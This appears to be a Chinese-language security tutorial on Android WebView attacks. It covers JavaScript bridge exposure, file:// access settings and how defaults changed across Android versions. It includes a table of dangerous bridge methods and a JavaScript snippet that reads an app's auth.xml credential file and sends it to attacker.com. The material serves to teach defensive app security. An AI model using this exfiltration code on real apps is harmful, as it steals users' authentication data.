WebView

​ Android 提供的内嵌浏览器组件，用来加载 HTML 页面实现部分功能。

​ WebView 运行在 App 进程中，能执行 JavaScript、访问网络、渲染 HTML/CSS，底层和 Chrome 使用相同的渲染引擎（Chromium）。

​ 和独立浏览器不同的是，WebView 拥有宿主 App 的所有权限，而且可以通过 JavaScript Bridge（JS 桥接）与原生代码交互。如果攻击者能控制 WebView 加载的内容，就等于在 App 的上下文中执行代码。

基础

WebViewClient ：开发者通过它控制页面加载行为

WebChromeClient： 处理 JavaScript 的 UI 交互，比如 alert()、confirm()、prompt() 弹窗，以及文件选择（<input type="file">）、地理位置请求等。

shouldOverrideUrlLoading()： 在 WebView 即将加载一个新 URL 时被调用，开发者可以在这里拦截并自行处理

JavaScript Bridge 暴露

本来网页里的 JS 只能做网页范围内的事情，一旦使用了webView.addJavascriptInterface(...)，网页里的 JS 就能直接调用 Android App 的 Java 方法。

利用方式：让受害APP打开攻击者的恶意网站里，从而运行攻击者的JS代码

JS Bridge 暴露的危害取决于两个条件：

  1. 攻击者能否控制 WebView 加载的页面（任意 URL 加载漏洞）
  2. Bridge 暴露了哪些方法

两个条件同时满足时，攻击者的页面就能调用 App 的原生方法。常见的危险方法类型：

方法类型 示例 危害
读取凭证 getToken()、getCookie() 窃取认证信息
读取设备信息 getDeviceId()、getPhoneNumber() 隐私泄露
文件操作 readFile()、writeFile() 读写 App 沙箱文件
执行命令 exec()、runCommand() 命令执行
发送请求 httpRequest()、postData() SSRF、数据外传

file://协议攻击

让网页 JavaScript 去读取手机本地文件

常见URL：https://example.com是网络资源

file：file:///data/data/app/files/config.txt代表本地文件资源

setAllowFileAccess()：是否允许 WebView 打开 file:// URL

setAllowFileAccessFromFileURLs()：file:// 页面能否读取其他 file:// 文件

setAllowUniversalAccessFromFileURLs()：file:// 页面能否访问任意来源

setAllowContentAccess()：是否允许访问content://

所以攻击条件：

  1. 允许加载 file://–setAllowFileAccess(true)

  2. 启用 JavaScript–setJavaScriptEnabled(true)

  3. 允许 file:// 跨文件读取–setAllowFileAccessFromFileURLs(true)或setAllowUniversalAccessFromFileURLs(true)

  4. 攻击者能控制加载 URL–

  5. webView.loadUrl(
    intent.getStringExtra("url")
)

攻击者可以让 WebView 加载一个本地 HTML 文件，文件中的 JavaScript 读取 App 沙箱内的其他文件：
var xhr = new XMLHttpRequest();
xhr.open("GET", "file:///data/data/com.target.app/shared_prefs/auth.xml", true);
xhr.onload = function() {
 new Image().src = "https://attacker.com/collect?data=" + encodeURIComponent(xhr.responseText);
};
xhr.send();

不同版本

Android 5.0（API 21）

独立 WebView 进程

从 Android 5.0 开始，WebView 的渲染引擎从 App 进程中分离，运行在独立的沙箱进程中。即使渲染引擎存在内存破坏漏洞，攻击者也需要额外的沙箱逃逸才能影响 App 进程。

Android 7.0（API 24）

WebView 独立更新

Android 7.0 开始，WebView 组件通过 Google Play 独立更新，不依赖系统 OTA。但国内设备通常没有 Google Play，WebView 更新依赖厂商的系统更新。

Android 9.0（API 28）

默认禁用明文HTTP

Android 9.0 引入了 Network Security Config（网络安全配置），默认禁止明文 HTTP 流量。WebView 加载 http:// URL 会被阻止，除非 App 在配置中显式允许：

Android 11（API 30）

file:// 访问默认关闭

Android 11 开始，setAllowFileAccess() 的默认值从 true 改为 false。WebView 默认不再能加载 file:// URL。但如果开发者显式设置 setAllowFileAccess(true)，风险依然存在。
